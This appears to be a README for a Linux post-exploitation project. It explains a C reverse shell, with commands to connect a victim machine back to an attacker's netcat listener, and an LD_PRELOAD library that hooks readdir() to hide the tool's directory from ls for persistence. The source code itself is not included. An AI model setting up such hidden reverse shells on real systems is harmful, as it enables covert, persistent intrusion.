## Linux Reverse Shell
Target system(victim) acts an client and sever is setup by connection initiator(attacker). This is used as a one of post-exploitation tools to gain persistent remote access to victim machine.

### Advantages
* This remove the requirement of victim's machine IP address and port
* May help an attacker to bypass incoming connection firewall rules.

### usage of reverseShell
<code>
    # victim's machine
    gcc rvrshell.c -o rvrshell <br> 
    ./rvrshell [IPV4 Addr] [port]
    
</code><br>
<code>
    # attacker's machine <br>
    nc -l [port] <br>
      <or>  <br>
    gcc shellsrv.c -o srv <br>
    ./shellsrv.c [port]
</code>



### Dynamic linking/ Function call hooking

Now to we will be looking at concept of **Function call hooking** using dynamic linking(shared libraries)-
Dynamic linker provides feature for development of shared libraries and debugging purposes. Such LD_PRELOAD environment viriable or /etc/ld.preload.so in linux which make loading specified library function into memory before default libraries.[<sup>1</sup>](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)

**Function call hooking** refers to a range of techniques used to intercept calls to pre-existing functions and wrap around them to modify the function’s behavior at runtime. [<sup>2</sup>](https://www.netspi.com/blog/technical/network-penetration-testing/function-hooking-part-i-hooking-shared-library-function-calls-in-linux/)


### Make it invisible & persistent
<!-- will GO here -->

We will be using function call hooking to hide our executables files from /bin/ls

Here, We hooked function **readdir()**[<sup>3</sup>](https://man7.org/linux/man-pages/man3/readdir.3.html) which act as C wrapper to getdents(), which is used by /bin/ls to list directories. <code>strace /bin/ls </code>

Instead of hiding files, we hooked readdir() function just to hide directory of name "reverseShell". We modified readdir() in such a way that when it get entry for "hidden_dir_name" it skips and hop to next entry and returns next dirent pointer.

> This can be further improve by hooking more function call to hide process from ps and netstat, but here it completes the purpose of project.

#### Usage & compilation of libreaddir.c -
<code>> gcc -Wall -fPIC -shared libreaddir.c -ldl -D_GNU_SOURCE -o libreaddir.so   </code> <br>
( by convention shared lib end with .so  & static lib with .a )
<br><code>> export LD_PRELOAD=/path/to/libreaddir.so </code>

[<sub>Read here for more details about shared library</sub>](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html)












